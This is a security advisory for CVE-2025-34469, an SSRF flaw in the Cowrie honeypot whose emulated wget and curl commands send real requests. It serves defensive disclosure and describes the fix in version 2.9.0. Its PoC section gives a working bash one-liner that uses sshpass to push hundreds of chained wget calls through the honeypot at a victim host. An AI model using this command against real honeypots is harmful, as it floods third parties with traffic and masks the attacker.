# [M] Cowrie has a SSRF vulnerability in wget/curl emulation enabling DDoS amplification

## Summary
Severity: Medium
Advisory: GHSA-83jg-m2pm-4jxj
CVE: CVE-2025-34469
CWE: CWE-918
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L (CVSS_V3)
Published: 2025-12-20
Source: https://github.com/advisories/GHSA-83jg-m2pm-4jxj
Type: github-advisory

## Affected
- PyPI: `cowrie` — affected >=0 <2.9.0

## Details
### Summary

A Server-Side Request Forgery (SSRF) vulnerability in Cowrie's emulated shell mode allows unauthenticated attackers to abuse the honeypot as an amplification vector for HTTP-based denial-of-service attacks against arbitrary third-party hosts.

### Details

When Cowrie operates in emulated shell mode (the default configuration), it basically emulates common Linux commands. The `wget` and `curl` command emulations actually perform real outbound HTTP requests to the destinations specified by the attacker, as this functionality is intended to allow Cowrie to save downloaded files for later inspection.

An attacker who connects to the honeypot via SSH or Telnet can repeatedly invoke these commands targeting a victim host. Since there was no rate limiting mechanism in place, the attacker could generate unlimited outbound HTTP traffic toward the victim. The requests originate from the honeypot's IP address, effectively masking the attacker's identity and turning the honeypot into an unwitting participant in distributed denial-of-service (DDoS) attacks.

This vulnerability was observed being actively exploited in the wild.

**Acknowledgements**
This vulnerability was investigated by _[Abraham Gebrehiwot](https://www.iit.cnr.it/en/abraham.gebrehiwot/)_ and _Filippo Lauria_, with additional contributions from _Michele Castellaneta_, _Claudio Porta_ and _Sara Afzal_. All researchers are affiliated with the [Institute of Informatics and Telematics](https://www.iit.cnr.it/en/) (IIT),  [Italian National Research Council](https://www.cnr.it/en/) (CNR).

**Fix**
This issue has been fixed in version 2.9.0 via PR #2800, which introduces a rate limiting mechanism for outbound requests in command emulations such as `wget` and `curl`.

### PoC

This is a rudimentary proof of concept demonstrating the amplification potential of this vulnerability.

**Setup:**
- Victim machine (192.168.1.30): runs a simple HTTP server
- Attacker machine (192.168.1.20): initiates the attack
- Cowrie honeypot (192.168.1.10): configured in emulated shell mode with SSH access (credentials: `test:test`)

**On the victim machine**, start an HTTP server:
```bash
sudo python3 -m http.server 80
```

**On the attacker machine**, execute:
```bash
PAYLOAD=$(for i in {1..100}; do echo -n 'wget -q http://192.168.1.30;'; done) && \
for i in {1..10}; do sshpass -p test ssh test@192.168.1.10 "$PAYLOAD"; done
```

This command builds a `PAYLOAD` consisting of 100 concatenated `wget` commands, then executes it 10 times via SSH, resulting in 1,000 HTTP requests toward the victim from a single attack script. The amplification factor can be arbitrarily increased by adjusting these values, bounded by technical limitations such as argument length, buffer sizes, etc.

**Result:** The victim's HTTP server logs show 1,000 requests originating exclusively from the honeypot's IP address (192.168.1.10), received within approximately 5 seconds (truncated for brevity):
```
192.168.1.10 - - [11/Dec/2025 14:33:03] "GET / HTTP/1.1" 200 -
192.168.1.10 - - [11/Dec/2025 14:33:03] "GET / HTTP/1.1" 200 -
192.168.1.10 - - [11/Dec/2025 14:33:03] "GET / HTTP/1.1" 200 -
...
192.168.1.10 - - [11/Dec/2025 14:33:08] "GET / HTTP/1.1" 200 -
192.168.1.10 - - [11/Dec/2025 14:33:08] "GET / HTTP/1.1" 200 -
192.168.1.10 - - [11/Dec/2025 14:33:08] "GET / HTTP/1.1" 200 -
```

Notice that the attacker's IP (192.168.1.20) never appears in the victim's logs, demonstrating how the honeypot masks the attacker's identity.

### Impact

This is a Server-Side Request Forgery (SSRF) vulnerability that enables abuse of Cowrie honeypots as DDoS amplification nodes.

**Who is impacted:** Any organization running Cowrie in emulated shell mode (the default configuration) with versions prior to 2.9.0.

**Consequences:**
- Third-party victims receive unwanted HTTP traffic from the honeypot's IP address
- Attackers can mask their identity behind the honeypot's IP
- Honeypot operators may face abuse complaints or have their infrastructure blocklisted
- Network resources of the honeypot host are consumed

## References
- https://github.com/cowrie/cowrie/security/advisories/GHSA-83jg-m2pm-4jxj
- https://nvd.nist.gov/vuln/detail/CVE-2025-34469
- https://github.com/cowrie/cowrie/issues/2622
- https://github.com/cowrie/cowrie/pull/2800
- https://github.com/advisories/GHSA-83jg-m2pm-4jxj
- https://github.com/cowrie/cowrie
- https://github.com/cowrie/cowrie/releases/tag/v2.9.0
- https://www.cve.org/cverecord?id=CVE-2025-34469
- https://www.vulncheck.com/advisories/cowrie-unrestricted-wget-curl-emulation-enables-ssrf-based-ddos-amplification
